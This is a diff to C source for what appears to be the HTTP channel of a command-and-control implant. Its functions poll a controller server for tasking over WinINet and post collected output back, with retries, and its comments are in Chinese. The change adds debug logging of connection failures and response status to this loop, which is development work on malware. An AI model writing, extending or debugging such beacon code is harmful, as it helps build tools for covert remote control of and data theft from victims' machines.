@@ -166,8 +166,11 @@ void http_post_maybe(char * hook) {
 	if (http_post_len == 0)
 		return;
 
-	if (connect_h == NULL)
+	if (connect_h == NULL) {
+		spawn_log("ch: post flush skip connect=NULL len=", (long)http_post_len);
 		return;
+	}
+	spawn_log("ch: post flush len=", (long)http_post_len);
 
 	/* 将ID转换为字符串，因为它是POST请求的参数 */
 	_snprintf(myid, 128, "%d", bigsession.myid);
@@ -187,6 +190,7 @@ void http_post_maybe(char * hook) {
 
 		/* 工作正常！太好了！ */
 		if (http_request_isOK(request)) {
+			spawn_log("ch: post OK retry=", (long)retry);
 			InternetCloseHandle(request);
 			break;
 		}
@@ -195,6 +199,7 @@ void http_post_maybe(char * hook) {
 			InternetCloseHandle(request);
 		}
 
+		spawn_log("ch: post FAIL retry=", (long)retry);
 		Sleep(500);
 	}
 
@@ -258,8 +263,11 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 	profile myprofile   = {0};
 	char    myuri[1024] = {0};
 
-	if (connect_h == NULL)
+	if (connect_h == NULL) {
+		spawn_log("ch: get fail connect=NULL", 0);
 		return -1;
+	}
+	spawn_log("ch: get cycle", 0);
 
 	/* 设置配置文件、应用GET请求转换并拼出请求URI（公共组装，见 channel_http_common.h） */
 	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_REQUEST,
@@ -277,9 +285,11 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 	/* 如果没有收到200 OK的HTTP状态响应则失败 */
 	if (!http_request_isOK(request)) {
 		// dlog("channel._http_get - Request is not OK \n");
+		spawn_log("ch: get NOT-OK", 0);
 		InternetCloseHandle(request);
 		return -1;
 	}
+	spawn_log("ch: get OK", 0);
 
 	/* 下一个技巧..检查我们得到了什么返回 */
 	status = InternetQueryDataAvailable(request, &avail, 0, 0);
